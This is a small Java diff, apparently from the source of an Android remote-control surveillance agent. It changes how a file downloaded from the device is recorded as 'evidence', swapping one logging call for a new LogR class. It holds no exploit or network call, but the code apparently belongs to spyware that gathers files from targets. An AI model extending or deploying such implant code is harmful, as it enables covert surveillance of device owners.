@@ -25,6 +25,8 @@ import java.util.Vector;
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.EvidenceType;
+import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
@@ -209,7 +211,10 @@ public abstract class Protocol {
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		final Evidence log = new Evidence(0);
-		log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
+		
+		new LogR(EvidenceType.DOWNLOAD, LogR.LOG_PRI_STD, additional, content);
+		
+		//log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
 
 	}
 
